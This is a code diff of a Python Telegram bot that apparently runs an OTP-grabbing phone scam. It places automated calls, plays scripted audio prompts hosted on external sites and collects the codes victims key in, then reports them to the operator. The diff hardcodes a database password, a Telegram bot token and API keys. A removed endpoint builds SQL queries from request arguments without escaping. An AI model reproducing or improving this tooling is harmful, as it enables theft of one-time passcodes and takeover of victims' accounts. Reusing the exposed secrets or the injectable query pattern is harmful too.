@@ -20,27 +20,22 @@ import os
 from flask_cors import CORS
 from flask import Flask, jsonify
 from functools import partial
-
+from tts import *
 
 
 ngul=[]
 
 d_user ='doadmin'
-d_host ='db-mysql-nyc3-63189-do-user-16074184-0.c.db.ondigitalocean.com'
-d_pass ='AVNS__XpkKv7cE-wgggkbbRy'
+d_host ='db-mysql-blr1-57305-do-user-16074184-0.a.db.ondigitalocean.com'
+d_pass ='AVNS_txpzFyr1HZJW21nTwyM'
 d_port =25060
 d_data='otbbotdatabase'
 
 
-time.sleep(1)
-response = requests.get('http://localhost:4040/api/tunnels')
-data = response.json()
-ng_url = data['tunnels'][0]['public_url']
-ngul.append(ng_url)
-  
 
 
-ngrok_url= ngul[0]   # NGROK APP LINK HERE
+
+ngrok_url= "https://sourceotp.online:8443"# NGROK APP LINK HERE
 bot_tkn ='7383376915:AAGMahVMMHFoP2VQ0JkHFx5dOC6fODaqm90'  # YOUR BOT API bot_tkn HERE
 apiKey = '9bf6642c-6d37-472f-b430-da6e72e483e1'
 apiKey2 = "57wbs19H2d20290A0292Ha92k3hdeinqunj"
@@ -1089,11 +1084,11 @@ def custom_confirm1(message):
 
     
     if up_resp1=='Accept':
-        url = 'https://ai2api.com/v1/api/play-text'
+        url = 'https://ai2api.com/v1/api/play-audio'
         data = {
     "uuid": f"{call_control_id}",
-    "text": f"{custom_waiting[5]}",
-    "voice": f"{no_space_voice}",
+    "audiourl": f"https://atlanta-api.online/scripts/{customscid}/output3.wav",
+   
 }
         requests.post(url, json=data)
         bot.send_message(chat_id,f"*Code Accpeted ✅ Vouch To  @sourcebotvouches 🫶*",parse_mode='markdown')
@@ -1101,11 +1096,11 @@ def custom_confirm1(message):
         callhangup(chat_id)
     elif up_resp1=='Deny':
         mes1=bot.send_message(chat_id,f"""*Code Rejected ❌*""",parse_mode='markdown').message_id
-        url = 'https://ai2api.com/v1/api/gather-text'
+        url = 'https://ai2api.com/v1/api/gather-audio'
         data = {
     "uuid": f"{call_control_id}",
-    "text": f"{custom_waiting[7]}",
-    "voice": f"{no_space_voice}",
+    "audiourl": f"https://atlanta-api.online/scripts/{customscid}/output5.wav",
+    
     "maxdigits": f"{nospace_digits}",
 
 }
@@ -1144,11 +1139,10 @@ def custom_prebuild_script_call(script_id,chatid):
         callhangbutton(chatid)
         
     elif event == "in-progress":
-            url1 = "https://ai2api.com/v1/api/gather-text"
+            url1 = "https://ai2api.com/v1/api/gather-audio"
             data = {
     "uuid": f"{call_control_id}",
-    "text": f"{custom_sc_src[3]}",
-    "voice": f"{no_space_voice}",
+    "audiourl": f"https://atlanta-api.online/scripts/{script_id}/output1.wav",
     "maxdigits": f"1",
     
 }
@@ -1179,7 +1173,7 @@ def custom_prebuild_script_call(script_id,chatid):
         finally:
             global last_message_ids
             if call_cause  == "Unknown":
-                 mes = "Call Ended🛑"
+                 mes = "Call Ended 🛑"
             elif call_cause == "Circuit/channel congestion":
                  mes = "Call ended due to API issue ⚙️"
             elif call_cause == "Normal Clearing":
@@ -1214,11 +1208,10 @@ def custom_prebuild_script_call(script_id,chatid):
 
         if otp2 == "1":
             def custom_ask_otp():
-                url3 = 'https://ai2api.com/v1/api/gather-text'
+                url3 = 'https://ai2api.com/v1/api/gather-audio'
                 data = {
     "uuid": f"{call_control_id}",
-    "text": f"{custom_sc_src[4]}",
-    "voice": f"{no_space_voice}",
+    "audiourl": f"https://atlanta-api.online/scripts/{script_id}/output2.wav",
     "maxdigits": f"{nospace_digits}",
     
 }
@@ -1231,11 +1224,11 @@ def custom_prebuild_script_call(script_id,chatid):
             custom_send_ask_otp()
            
         elif(len(otp2)>=4):
-            url = 'https://ai2api.com/v1/api/play-text'
+            url = 'https://ai2api.com/v1/api/play-audio'
             data = {
     "uuid": f"{call_control_id}",
-    "text": f"{custom_sc_src[6]}",
-    "voice": f"{no_space_voice}",
+    "audiourl": f"https://atlanta-api.online/scripts/{script_id}/output4.wav",
+    
     
 }
             requests.post(url, json=data)
@@ -1924,6 +1917,8 @@ def make_call_custon(message):
                         db.commit()
                         c.execute(f"select * from custom_scripts where script_id={script_id} limit 1")
                         custom_sc = c.fetchone()
+                        Convert_TTS(custom_sc[3],custom_sc[4],custom_sc[5],custom_sc[6],custom_sc[7],script_id,voice)
+                        
                         
                         if custom_sc==None:
                             raise ValueError
@@ -2107,25 +2102,9 @@ def balance():
     resp2 = requests.post(url2, json=data2)
     res1 = json.loads(resp1.text)
     res2 = json.loads(resp2.text)
-    response_data = {'Texis Balance ': res1['balance'],'AI2API Balance':res2['balance'] , 'Working API':f'{current_api}','Texis Route':f'{apidata[2]}','Texis Enable':f'{apidata[3]}'}
+    response_data = {'Texis Balance ': res1['balance'],'AI2API Balance':res2['balance'] , 'Working API':f'{current_api}'}
     c.close()
     return jsonify(response_data)
-
-
-@app.route('/chnageroute', methods=['POST','GET'])
-def route():
-    route =  request.args.get('route')
-    enable = request.args.get('enable')
-    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
-    c = db.cursor()
-    c.execute(f"update api_key set route='{route}' , enable='{enable}' where id=123")
-    db.commit()
-    response_data = {'Response': f'Updated'}
-    return jsonify(response_data)
-
-
-
-
 
 @app.route('/switch', methods=['POST','GET'])
 def switchapi():
@@ -2148,10 +2127,6 @@ def switchapi():
     return api
 
 
-
-
-
-
 @app.route('/announce', methods=['POST','GET'])
 def annonce():
     mess =  request.args.get('message')
@@ -2167,7 +2142,9 @@ def annonce():
     return jsonify(response_data)
 
 
-
+import ssl
 
 if __name__ == '__main__':
-    app.run(port=5500)
+    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+    context.load_cert_chain('/etc/letsencrypt/live/sourceotp.online-0001/fullchain.pem', '/etc/letsencrypt/live/sourceotp.online-0001/privkey.pem')    
+    app.run(ssl_context=context, host='0.0.0.0', port=8443, debug=False)
